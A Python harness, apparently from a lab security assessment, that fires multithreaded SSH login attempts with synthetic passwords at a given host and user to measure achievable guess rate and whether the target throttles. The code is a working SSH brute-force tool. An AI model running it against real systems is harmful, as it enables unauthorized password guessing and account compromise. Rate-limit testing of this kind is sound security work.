"""SSH route ladder -- the THIRD credential store on this host (/etc/shadow, yescrypt).

The catalogue names two WEB routes; port 22 is a third, unnamed one. Measured
here so it is not filed as an untested surface. Own harness rather than hydra,
because hydra's -W/-T throttle is precisely the instrument that produced lab
118's false negative: a rate the OPERATOR chose can read as a rate the TARGET
chose. -T is therefore absent here by construction.
"""
import paramiko, time, sys, threading, collections, statistics, socket

HOST = sys.argv[1]
USER = sys.argv[2]
N    = int(sys.argv[3])

def attempt(pw):
    t = time.perf_counter()
    c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        c.connect(HOST, port=22, username=USER, password=pw,
                  allow_agent=False, look_for_keys=False, timeout=20,
                  banner_timeout=20, auth_timeout=20)
        ok = True
    except paramiko.AuthenticationException:
        ok = False
    except Exception as e:
        return ("ERR:" + type(e).__name__), 0, time.perf_counter() - t, False
    finally:
        try: c.close()
        except Exception: pass
    return "auth-fail", 0, time.perf_counter() - t, ok

def chunk(n, w):
    step = -(-n // w)
    parts = [list(range(i, min(i + step, n))) for i in range(0, n, step)]
    flat = [i for p in parts for i in p]
    assert sorted(flat) == list(range(n)) and len(flat) == len(set(flat)) == n
    return parts

def rung(w):
    out = {}; lock = threading.Lock()
    def run(idx):
        loc = {}
        for i in idx:
            try: loc[i] = attempt("p%06d" % i)
            except Exception as e: loc[i] = ("HARNESS:" + type(e).__name__, 0, 0.0, False)
        with lock: out.update(loc)
    ths = [threading.Thread(target=run, args=(p,)) for p in chunk(N, w)]
    t = time.perf_counter()
    for th in ths: th.start()
    for th in ths: th.join()
    d = time.perf_counter() - t
    vals = [out[i] for i in sorted(out)]
    if len(vals) != N: raise SystemExit("HARNESS FAILURE: %d of %d" % (len(vals), N))
    return (d, len(vals), collections.Counter(v[0] for v in vals),
            [v[2] for v in vals], sum(1 for v in vals if v[3]))

print("=== SSH user=%s host=%s ===" % (USER, HOST))
for w in (16,):
    d, done, st, lat, hits = rung(w)
    print("RUNG workers=%-3d attempts=%-4d elapsed=%.2fs achieved=%7.2f attempts/s outcomes=%s median_latency=%.3fs hits=%d"
          % (w, done, d, done / d, dict(st), statistics.median(lat), hits))
